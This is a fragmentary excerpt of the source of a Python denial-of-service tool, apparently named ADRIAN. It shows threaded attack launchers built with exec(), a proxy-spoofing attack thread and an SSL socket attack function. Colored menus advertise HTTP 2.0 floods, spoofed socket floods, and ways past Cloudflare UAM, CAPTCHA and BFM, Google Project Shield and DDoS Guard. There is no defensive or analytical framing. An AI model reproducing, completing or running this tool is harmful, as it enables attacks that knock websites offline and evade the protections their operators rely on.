    ...
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            ...
            stdout.write(
                ...
                + Fore.WHITE
                + " Attack status => "
                + str((until - datetime.datetime.now()).total_seconds())
                + " sec left "
            )
...
def Launch(url, th, t, method):  # testing
    ...
    for _ in range(int(th)):
        try:
            exec(
                "threading.Thread(target=Attack"
                + method
                + ", args=(url, until)).start()"
            )
    ...
    for _ in range(int(th)):
        try:
            ...
            thd = threading.Thread(
                target=AttackPXSPOOF, args=(target, until, req, randomproxy)
            )
...
def AttackCFSOC(until_datetime, target, req):
    if target["scheme"] == "https":
        ...
        packet = ssl.create_default_context().wrap_socket(
            packet, server_hostname=target["host"]
        )
...
def layer7():
    ...
    stdout.write(
        ...
        + " |"
        + Fore.LIGHTWHITE_EX
        + " Bypass CF UAM, CAPTCHA, BFM (request)    "
        + Fore.LIGHTCYAN_EX
        + "║\n"
    )
    ...
    stdout.write(
        ...
        + " |"
        + Fore.LIGHTWHITE_EX
        + " Bypass CF UAM, CAPTCHA, BFM (socket)     "
        + Fore.LIGHTCYAN_EX
        + "║\n"
    )
    ...
    stdout.write(
        ...
        + " |"
        + Fore.LIGHTWHITE_EX
        + " Bypass Google Project Shield, Vshield,   "
        + Fore.LIGHTCYAN_EX
        + "║\n"
    )
    ...
    stdout.write(
        ...
        + " |"
        + Fore.LIGHTWHITE_EX
        + " DDoS Guard Free, CF NoSec With Proxy     "
        + Fore.LIGHTCYAN_EX
        + "║\n"
    )
    ...
    stdout.write(
        ...
        + " |"
        + Fore.LIGHTWHITE_EX
        + " HTTP 2.0 Request Attack With Proxy       "
        + Fore.LIGHTCYAN_EX
        + "║\n"
    )
    ...
    stdout.write(
        ...
        + " |"
        + Fore.LIGHTWHITE_EX
        + " HTTP Spoof Socket Attack With Proxy      "
        + Fore.LIGHTCYAN_EX
        + "║\n"
    )
...
def title():
    ...
    stdout.write(
        ...
        + "║ "
        + Fore.RED
        + "        Welcome To The Main Screen Of ADRIAN  "
        + Fore.LIGHTGREEN_EX
        + "       ║\n"
    )
...
def command():
    ...
    if command == "cls" or command == "clear":
        ...
        stdout.write(
            Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n"
        )
...
def func():
    ...
    stdout.write(
        ...
        + ": "
        + Fore.WHITE
        + "Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n"
    )
    ...
    stdout.write(
        ...
        + ": "
        + Fore.WHITE
        + "Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n"
    )
